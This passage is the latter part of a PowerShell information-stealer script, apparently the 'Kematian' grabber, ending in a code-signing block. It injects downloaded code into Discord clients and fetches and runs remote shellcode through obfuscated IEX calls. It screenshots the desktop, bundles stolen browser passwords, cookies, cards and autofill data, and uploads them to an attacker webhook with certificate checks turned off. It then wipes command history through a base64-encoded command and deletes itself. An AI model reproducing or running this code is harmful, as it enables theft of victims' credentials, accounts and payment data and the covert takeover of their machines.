    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }


    $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
    $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")

    foreach ($path in $discPaths) {
        $skibidipath = Join-Path $locAppData $path
        if (-not (Test-Path $skibidipath)) {
            continue
        }
        Get-ChildItem $skibidipath -Recurse | ForEach-Object {
            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
                $files = Get-ChildItem $_.FullName
                foreach ($file in $files) {
                    if ($file.Name -eq "index.js") {
                        $webClient = New-Object System.Net.WebClient
                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/Pirate-Devs/Kematian/main/frontend-src/injection.js")
                        if ($content -ne "") {
                            $data_webhook = $webhook -replace "/data", "/injection"
                            $replacedContent = $content -replace "%WEBHOOK%", $data_webhook
                            $replacedContent | Set-Content -Path $file.FullName -Force
                        }
                    }
                }
            }
        }
    }
    
    #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
    
    Write-Host "[!] Injecting Shellcode" -ForegroundColor Green
    $kematian_shellcode = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/kematian_shellcode.ps1")
    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
    $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
    $proc.WaitForExit()
    Write-Host "[!] Shellcode Injection Completed" -ForegroundColor Green

    $main_temp = "$env:localappdata\temp"

    $top = ($screen.Bounds.Top | Measure-Object -Minimum).Minimum
    $left = ($screen.Bounds.Left | Measure-Object -Minimum).Minimum
    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $bmp.Save("$main_temp\screenshot.png")
    $graphics.Dispose()
    $bmp.Dispose()


    Write-Host "[!] Screenshot Captured" -ForegroundColor Green

    Move-Item "$main_temp\discord.json" $folder_general -Force -EA Ignore    
    Move-Item "$main_temp\screenshot.png" $folder_general -Force -EA Ignore
    Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force -EA Ignore
    Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force -EA Ignore
    #move any file that starts with cookies_netscape
    Get-ChildItem -Path $main_temp -Filter "cookies_netscape*" | Move-Item -Destination "$browser_data" -Force -EA Ignore
    Move-Item -Path "$main_temp\downloads.json" -Destination "$browser_data" -Force -EA Ignore
    Move-Item -Path "$main_temp\history.json" -Destination "$browser_data" -Force -EA Ignore
    Move-Item -Path "$main_temp\passwords.json" -Destination "$browser_data" -Force -EA Ignore
    Move-Item -Path "$main_temp\bookmarks.json" -Destination "$browser_data" -Force -EA Ignore

    #remove empty dirs
    do {
        $dirs = Get-ChildItem $folder_general -Directory -Recurse | Where-Object { (Get-ChildItem $_.FullName).Count -eq 0 } | Select-Object -ExpandProperty FullName
        $dirs | ForEach-Object { Remove-Item $_ -Force }
    } while ($dirs.Count -gt 0)
    
    Write-Host "[!] Getting information about the extracted data" -ForegroundColor Green
    
    function ProcessCookieFiles {
        $domaindetects = New-Item -ItemType Directory -Path "$folder_general\DomainDetects" -Force
        $cookieFiles = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*"
        foreach ($file in $cookieFiles) {
            $outputFileName = $file.Name -replace "^cookies_netscape_|-Browser"
            $fileContents = Get-Content -Path $file.FullName
            $domainCounts = @{}
            foreach ($line in $fileContents) {
                if ($line -match "^\s*(\S+)\s") {
                    $domain = $matches[1].TrimStart('.')
                    if ($domainCounts.ContainsKey($domain)) {
                        $domainCounts[$domain]++
                    }
                    else {
                        $domainCounts[$domain] = 1
                    }
                }
            }
            $outputString = ($domainCounts.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name) ($($_.Value))" }) -join "`n"
            $outputFilePath = Join-Path -Path $domaindetects -ChildPath $outputFileName
            Set-Content -Path $outputFilePath -Value $outputString
        }
    }
    ProcessCookieFiles 

    $b64_uuid = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($uuid))
    $b64_countrycode = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($countrycode))
    $b64_hostname = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($hostname))
    $b64_filedate = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($filedate))
    $b64_timezoneString = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($timezoneString))
    #$zipFileName = "$uuid`_$countrycode`_$hostname`_$filedate`_$timezoneString.zip"
    $zipFileName = "$b64_uuid`_$b64_countrycode`_$b64_hostname`_$b64_filedate`_$b64_timezoneString.zip"
    $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"

    Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force

    Write-Host $ZipFilePath
    Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
    if ( -not ($write_disk_only)) {    
        class TrustAllCertsPolicy : System.Net.ICertificatePolicy {
            [bool] CheckValidationResult([System.Net.ServicePoint] $a,
                [System.Security.Cryptography.X509Certificates.X509Certificate] $b,
                [System.Net.WebRequest] $c,
                [int] $d) {
                return $true
            }
        }
        [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new()
        $went_through = $false
        while (-not $went_through) {
            try {
                $httpClient = [Net.Http.HttpClient]::new()
                $multipartContent = [Net.Http.MultipartFormDataContent]::new()
                $fileStream = [IO.File]::OpenRead($zipFilePath)
                $fileContent = [Net.Http.StreamContent]::new($fileStream)
                $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
                $multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))
                $response = $httpClient.PostAsync($webhook, $multipartContent).Result
                $responseContent = $response.Content.ReadAsStringAsync().Result
                Write-Host $responseContent
                $went_through = $true
            }
            catch {
                $sleepTime = Get-Random -Minimum 5 -Maximum 10
                Write-Host "[!] An error occurred, retrying in $sleepTime seconds" -ForegroundColor Yellow
                Start-Sleep -Seconds $sleepTime
            }
        }
        $fileStream.Dispose()
        $httpClient.Dispose()
        $multipartContent.Dispose()
        $fileContent.Dispose()
        Remove-Item "$zipFilePath" -Force
    }
    Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
    # cleanup
    Remove-Item "$env:appdata\Kematian" -Force -Recurse
}

if (CHECK_AND_PATCH -eq $true) {  
    KDMUTEX
    if (!($debug)) {
        CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 0 -Unknown1 0 -Unknown2 0
    }
    $script:SingleInstanceEvent.Close()
    $script:SingleInstanceEvent.Dispose()
    #removes history
    I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
    if ($debug) {
        Read-Host -Prompt "Press Enter to continue"
    }
    if ($melt) { 
        try {
            Remove-Item $pscommandpath -force
        }
        catch {}
    }
}
else {
    Write-Host "[!] Please run as admin !" -ForegroundColor Red
    Start-Sleep -s 1
    Request-Admin
}
# SIG # Begin signature block
# MIIXxQYJKoZIhvcNAQcCoIIXtjCCF7ICAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUmTF4F9lOM6mWUtzciYUerGL3
# 9DGgghGxMIIDxDCCAqygAwIBAgIQFnuVL2Vw5YNE2JJmXLgOCzANBgkqhkiG9w0B
# AQsFADB5MQswCQYDVQQGEwJVUzERMA8GA1UECAwISWxsaW5vaXMxEDAOBgNVBAcM
# B0NoaWNhZ28xFDASBgNVBAsMC1NvbWFsaS1EZXZzMRkwFwYDVQQKDBBTb21hbGlh
# LURldi1UZWFtMRQwEgYDVQQDDAtTb21hbGktRGV2czAgFw0yNDA3MTkwMjQ1NTla
# GA8yMTAwMDcxOTAyNTU1OVoweTELMAkGA1UEBhMCVVMxETAPBgNVBAgMCElsbGlu
# b2lzMRAwDgYDVQQHDAdDaGljYWdvMRQwEgYDVQQLDAtTb21hbGktRGV2czEZMBcG
# A1UECgwQU29tYWxpYS1EZXYtVGVhbTEUMBIGA1UEAwwLU29tYWxpLURldnMwggEi
# MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDXwP8AMkQmlRioT+PsBuVeV1tJ
# xX/6pkFcV4mdmrRTpxjHXW/6Fy0+o2p8gIB1g5ZbI/+X5Id/eqZzUC2wuteO/0vN
# y4OM0U+vQQBayF4Ncq+8nBBuo86mfDlGWknT5hp/s+E12Cp44TrFmoE8lD+4YIEG
# O/2WTb2JxsaqeFG3VvtGOql4uXwgJ5PkSPrbgUXebc/IEJ77LQz+DCVipR9FPI4E
# 9xRaD5v1mXBodVFakJ+2OFeGzkUZy98FAD/HziTIjdKJ0dkWU+An3s1SoiiwEBha
# 3VVmLkgLoxzQ8CcYWGvcVp7BcGthGGs3SCXbLqGHwHANKZd9H4IAVzY0Fvc9AgMB
# AAGjRjBEMA4GA1UdDwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNV
# HQ4EFgQU82iXrTAWxcC+4ISflLIHIqx+TUYwDQYJKoZIhvcNAQELBQADggEBAMo6
# efLhZZgqj/rzMNHG2seVT7RRwcMeIcuuGi3wzYBFPRtVxVwRpJBrzg2fZ+/YhuMl
# uEe7Vn8rCeMkzvI6KZtVfTmTcu3Jmpb9Xf/8H6xR3rwbE8LsfMzHjsd1bQtof/Qp
# oZEuGAljd8nWWgY6YSACRS5ulNsyM6QgES7TzRHXtKXmi5CyglMKN8saQrvINeHO
# KrL1cEJHzMiNU5ZGWlx87jxzRaMWO545COyucjta3E7wNlZYQDnjchEb8OKo7WIK
# hYyqCfXwIDDTccj7s55JiAK0z3uRJAPKFK8s5KyYTTlyFyCH5OSbganI2dp18Mc1
# leWiJWWknY0GEv1nk3YwggbsMIIE1KADAgECAhAwD2+s3WaYdHypRjaneC25MA0G
# CSqGSIb3DQEBDAUAMIGIMQswCQYDVQQGEwJVUzETMBEGA1UECBMKTmV3IEplcnNl
# eTEUMBIGA1UEBxMLSmVyc2V5IENpdHkxHjAcBgNVBAoTFVRoZSBVU0VSVFJVU1Qg
# TmV0d29yazEuMCwGA1UEAxMlVVNFUlRydXN0IFJTQSBDZXJ0aWZpY2F0aW9uIEF1
# dGhvcml0eTAeFw0xOTA1MDIwMDAwMDBaFw0zODAxMTgyMzU5NTlaMH0xCzAJBgNV
# BAYTAkdCMRswGQYDVQQIExJHcmVhdGVyIE1hbmNoZXN0ZXIxEDAOBgNVBAcTB1Nh
# bGZvcmQxGDAWBgNVBAoTD1NlY3RpZ28gTGltaXRlZDElMCMGA1UEAxMcU2VjdGln
# byBSU0EgVGltZSBTdGFtcGluZyBDQTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCC
# AgoCggIBAMgbAa/ZLH6ImX0BmD8gkL2cgCFUk7nPoD5T77NawHbWGgSlzkeDtevE
# zEk0y/NFZbn5p2QWJgn71TJSeS7JY8ITm7aGPwEFkmZvIavVcRB5h/RGKs3EWsnb
# 111JTXJWD9zJ41OYOioe/M5YSdO/8zm7uaQjQqzQFcN/nqJc1zjxFrJw06PE37PF
# cqwuCnf8DZRSt/wflXMkPQEovA8NT7ORAY5unSd1VdEXOzQhe5cBlK9/gM/REQpX
# hMl/VuC9RpyCvpSdv7QgsGB+uE31DT/b0OqFjIpWcdEtlEzIjDzTFKKcvSb/01Mg
# x2Bpm1gKVPQF5/0xrPnIhRfHuCkZpCkvRuPd25Ffnz82Pg4wZytGtzWvlr7aTGDM
# qLufDRTUGMQwmHSCIc9iVrUhcxIe/arKCFiHd6QV6xlV/9A5VC0m7kUaOm/N14Tw
# 1/AoxU9kgwLU++Le8bwCKPRt2ieKBtKWh97oaw7wW33pdmmTIBxKlyx3GSuTlZic
# l57rjsF4VsZEJd8GEpoGLZ8DXv2DolNnyrH6jaFkyYiSWcuoRsDJ8qb/fVfbEnb6
# ikEk1Bv8cqUUotStQxykSYtBORQDHin6G6UirqXDTYLQjdprt9v3GEBXc/Bxo/tK
# fUU2wfeNgvq5yQ1TgH36tjlYMu9vGFCJ10+dM70atZ2h3pVBeqeDAgMBAAGjggFa
# MIIBVjAfBgNVHSMEGDAWgBRTeb9aqitKz1SA4dibwJ3ysgNmyzAdBgNVHQ4EFgQU
# GqH4YRkgD8NBd0UojtE1XwYSBFUwDgYDVR0PAQH/BAQDAgGGMBIGA1UdEwEB/wQI
# MAYBAf8CAQAwEwYDVR0lBAwwCgYIKwYBBQUHAwgwEQYDVR0gBAowCDAGBgRVHSAA
# MFAGA1UdHwRJMEcwRaBDoEGGP2h0dHA6Ly9jcmwudXNlcnRydXN0LmNvbS9VU0VS
# VHJ1c3RSU0FDZXJ0aWZpY2F0aW9uQXV0aG9yaXR5LmNybDB2BggrBgEFBQcBAQRq
# MGgwPwYIKwYBBQUHMAKGM2h0dHA6Ly9jcnQudXNlcnRydXN0LmNvbS9VU0VSVHJ1
# c3RSU0FBZGRUcnVzdENBLmNydDAlBggrBgEFBQcwAYYZaHR0cDovL29jc3AudXNl
# cnRydXN0LmNvbTANBgkqhkiG9w0BAQwFAAOCAgEAbVSBpTNdFuG1U4GRdd8DejIL
# LSWEEbKw2yp9KgX1vDsn9FqguUlZkClsYcu1UNviffmfAO9Aw63T4uRW+VhBz/FC
# 5RB9/7B0H4/GXAn5M17qoBwmWFzztBEP1dXD4rzVWHi/SHbhRGdtj7BDEA+N5Pk4
# Yr8TAcWFo0zFzLJTMJWk1vSWVgi4zVx/AZa+clJqO0I3fBZ4OZOTlJux3LJtQW1n
# zclvkD1/RXLBGyPWwlWEZuSzxWYG9vPWS16toytCiiGS/qhvWiVwYoFzY16gu9jc
# 10rTPa+DBjgSHSSHLeT8AtY+dwS8BDa153fLnC6NIxi5o8JHHfBd1qFzVwVomqfJ
# N2Udvuq82EKDQwWli6YJ/9GhlKZOqj0J9QVst9JkWtgqIsJLnfE5XkzeSD2bNJaa
# CV+O/fexUpHOP4n2HKG1qXUfcb9bQ11lPVCBbqvw0NP8srMftpmWJvQ8eYtcZMzN
# 7iea5aDADHKHwW5NWtMe6vBE5jJvHOsXTpTDeGUgOw9Bqh/poUGd/rG4oGUqNODe
# qPk85sEwu8CgYyz8XBYAqNDEf+oRnR4GxqZtMl20OAkrSQeq/eww2vGnL8+3/frQ
# o4TZJ577AWZ3uVYQ4SBuxq6x+ba6yDVdM3aO8XwgDCp3rrWiAoa6Ke60WgCxjKvj
# +QrJVF3UuWp0nr1Irpgwggb1MIIE3aADAgECAhA5TCXhfKBtJ6hl4jvZHSLUMA0G
# CSqGSIb3DQEBDAUAMH0xCzAJBgNVBAYTAkdCMRswGQYDVQQIExJHcmVhdGVyIE1h
# bmNoZXN0ZXIxEDAOBgNVBAcTB1NhbGZvcmQxGDAWBgNVBAoTD1NlY3RpZ28gTGlt
# aXRlZDElMCMGA1UEAxMcU2VjdGlnbyBSU0EgVGltZSBTdGFtcGluZyBDQTAeFw0y
# MzA1MDMwMDAwMDBaFw0zNDA4MDIyMzU5NTlaMGoxCzAJBgNVBAYTAkdCMRMwEQYD
# VQQIEwpNYW5jaGVzdGVyMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxLDAqBgNV
# BAMMI1NlY3RpZ28gUlNBIFRpbWUgU3RhbXBpbmcgU2lnbmVyICM0MIICIjANBgkq
# hkiG9w0BAQEFAAOCAg8AMIICCgKCAgEApJMoUkvPJ4d2pCkcmTjA5w7U0RzsaMsB
# ZOSKzXewcWWCvJ/8i7u7lZj7JRGOWogJZhEUWLK6Ilvm9jLxXS3AeqIO4OBWZO2h
# 5YEgciBkQWzHwwj6831d7yGawn7XLMO6EZge/NMgCEKzX79/iFgyqzCz2Ix6lkoZ
# E1ys/Oer6RwWLrCwOJVKz4VQq2cDJaG7OOkPb6lampEoEzW5H/M94STIa7GZ6A3v
# u03lPYxUA5HQ/C3PVTM4egkcB9Ei4GOGp7790oNzEhSbmkwJRr00vOFLUHty4Fv9
# GbsfPGoZe267LUQqvjxMzKyKBJPGV4agczYrgZf6G5t+iIfYUnmJ/m53N9e7UJ/6
# GCVPE/JefKmxIFopq6NCh3fg9EwCSN1YpVOmo6DtGZZlFSnF7TMwJeaWg4Ga9mBm
# kFgHgM1Cdaz7tJHQxd0BQGq2qBDu9o16t551r9OlSxihDJ9XsF4lR5F0zXUS0Zxv
# 5F4Nm+x1Ju7+0/WSL1KF6NpEUSqizADKh2ZDoxsA76K1lp1irScL8htKycOUQjeI
# IISoh67DuiNye/hU7/hrJ7CF9adDhdgrOXTbWncC0aT69c2cPcwfrlHQe2zYHS0R
# QlNxdMLlNaotUhLZJc/w09CRQxLXMn2YbON3Qcj/HyRU726txj5Ve/Fchzpk8WBL
# BU/vuS/sCRMCAwEAAaOCAYIwggF+MB8GA1UdIwQYMBaAFBqh+GEZIA/DQXdFKI7R
# NV8GEgRVMB0GA1UdDgQWBBQDDzHIkSqTvWPz0V1NpDQP0pUBGDAOBgNVHQ8BAf8E
# BAMCBsAwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDBKBgNV
# HSAEQzBBMDUGDCsGAQQBsjEBAgEDCDAlMCMGCCsGAQUFBwIBFhdodHRwczovL3Nl
# Y3RpZ28uY29tL0NQUzAIBgZngQwBBAIwRAYDVR0fBD0wOzA5oDegNYYzaHR0cDov
# L2NybC5zZWN0aWdvLmNvbS9TZWN0aWdvUlNBVGltZVN0YW1waW5nQ0EuY3JsMHQG
# CCsGAQUFBwEBBGgwZjA/BggrBgEFBQcwAoYzaHR0cDovL2NydC5zZWN0aWdvLmNv
# bS9TZWN0aWdvUlNBVGltZVN0YW1waW5nQ0EuY3J0MCMGCCsGAQUFBzABhhdodHRw
# Oi8vb2NzcC5zZWN0aWdvLmNvbTANBgkqhkiG9w0BAQwFAAOCAgEATJtlWPrgec/v
# FcMybd4zket3WOLrvctKPHXefpRtwyLHBJXfZWlhEwz2DJ71iSBewYfHAyTKx6Xw
# Jt/4+DFlDeDrbVFXpoyEUghGHCrC3vLaikXzvvf2LsR+7fjtaL96VkjpYeWaOXe8
# vrqRZIh1/12FFjQn0inL/+0t2v++kwzsbaINzMPxbr0hkRojAFKtl9RieCqEeajX
# Pawhj3DDJHk6l/ENo6NbU9irALpY+zWAT18ocWwZXsKDcpCu4MbY8pn76rSSZXwH
# fDVEHa1YGGti+95sxAqpbNMhRnDcL411TCPCQdB6ljvDS93NkiZ0dlw3oJoknk5f
# TtOPD+UTT1lEZUtDZM9I+GdnuU2/zA2xOjDQoT1IrXpl5Ozf4AHwsypKOazBpPmp
# fTXQMkCgsRkqGCGyyH0FcRpLJzaq4Jgcg3Xnx35LhEPNQ/uQl3YqEqxAwXBbmQpA
# +oBtlGF7yG65yGdnJFxQjQEg3gf3AdT4LhHNnYPl+MolHEQ9J+WwhkcqCxuEdn17
# aE+Nt/cTtO2gLe5zD9kQup2ZLHzXdR+PEMSU5n4k5ZVKiIwn1oVmHfmuZHaR6Ej+
# yFUK7SnDH944psAU+zI9+KmDYjbIw74Ahxyr+kpCHIkD3PVcfHDZXXhO7p9eIOYJ
# anwrCKNI9RX8BE/fzSEceuX1jhrUuUAxggV+MIIFegIBATCBjTB5MQswCQYDVQQG
# EwJVUzERMA8GA1UECAwISWxsaW5vaXMxEDAOBgNVBAcMB0NoaWNhZ28xFDASBgNV
# BAsMC1NvbWFsaS1EZXZzMRkwFwYDVQQKDBBTb21hbGlhLURldi1UZWFtMRQwEgYD
# VQQDDAtTb21hbGktRGV2cwIQFnuVL2Vw5YNE2JJmXLgOCzAJBgUrDgMCGgUAoHgw
# GAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGC
# NwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAjBgkqhkiG9w0BCQQx
# FgQUQ2UR4sLDkKQMQeh/W0KTrF4FbzEwDQYJKoZIhvcNAQEBBQAEggEAqacVaUqX
# f5EiNtbaEF6r7iyJfLHI6MNHzoehulcR52ZQ5NajP7r7RzSfCK1H4/kl6W87xsRi
# ykTG4rApKcldROSL8hf1vOXwxN6DRBeOukSwuUfWd92WBGa4hZtyPbBvXJ0sEEyA
# QgISYDL1+oUhvFqGrDpDI9a/+q79mVse/81Ie5apq0gZZ6NnqJ5m9q0HiXskZLzK
# g7V7irbYxOfmTqcMiT4aARLy48MQmiHMII32B+//siwetvRMC1anu1kxa2DqTZMA
# RblrdybzCv30+Z+LMqNjxbEDuWEGfm4ZskBgdRmQonz77SKw/oQDFPkslSG/pPS6
# Sq6W4voomzwaZKGCA0swggNHBgkqhkiG9w0BCQYxggM4MIIDNAIBATCBkTB9MQsw
# CQYDVQQGEwJHQjEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQH
# EwdTYWxmb3JkMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxJTAjBgNVBAMTHFNl
# Y3RpZ28gUlNBIFRpbWUgU3RhbXBpbmcgQ0ECEDlMJeF8oG0nqGXiO9kdItQwDQYJ
# YIZIAWUDBAICBQCgeTAYBgkqhkiG9w0BCQMxCwYJKoZIhvcNAQcBMBwGCSqGSIb3
# DQEJBTEPFw0yNDA3MTkwMjU2MDJaMD8GCSqGSIb3DQEJBDEyBDDc3B+l7K9rzgm3
# Snw+0PDB6wx9iCuw1Nb+WcpwWRdwYj36neZM4MQX7Lvyn7nl/zcwDQYJKoZIhvcN
# AQEBBQAEggIAMdAcTuIu+UfxnSQKnWdB/1x+l/ssqaXLo/vGL3jsObKiS/aUILnT
# BdQDvIeyIg11jgP7khlmvvDlSQWbBSVLdOkqoigJztIrssXz0MpZI5k2Bm6bL3oH
# nNRRhyf5m0+aA4uz/+vdXKPduYt6ASv8jX9haF1VHNiLjfw3Pg6fIBWgEekDnAgm
# l2Ok1fwFYr8umfpwCDR0IpX9ecS6vw2FsBMASF9pXWzz0nNijp06BRzROOfGM+pI
# tlU8Zu2go3fiHSipV1yKQdWvbo/Or+Eur8nDghD2KQXpUngNoDVNio/2gF4wZJe7
# w6RuIPYOBuoqNwsgNUNCCsCMYVn7xbR3PD5AyurvPkAYHYxhY25o4ZdqdkIq6g6t
# Cema5Cnuu+6fSzR/iXMQJEOP6xrfjWcpRWBo+7vOez3SDwxvEFcAqIWFQgeU+9aC
# 1vHjRV/WHMRWBKkZWlGiWmwUsrc9Epqft+FrIz1ofm1s6LJ0Ov75vH63fJgBSRDF
# D/NAFZrxYkVrXTGMVlm6wXStGsePmmnoNTZgZtNq3wvzx/CQjLcRz0RaFnNVppAd
# wVTUq6S+O2FsvXbOgSNy11HjlBRGHeE2A+yWJ5vIrbP2cr1Gxy7a4maX9+0huyvn
# EqSgj5oOc8A3DnH6fIruEyhMIN2VahXib+Lz/U5DotZgwe1AjDagaRM=
# SIG # End signature block
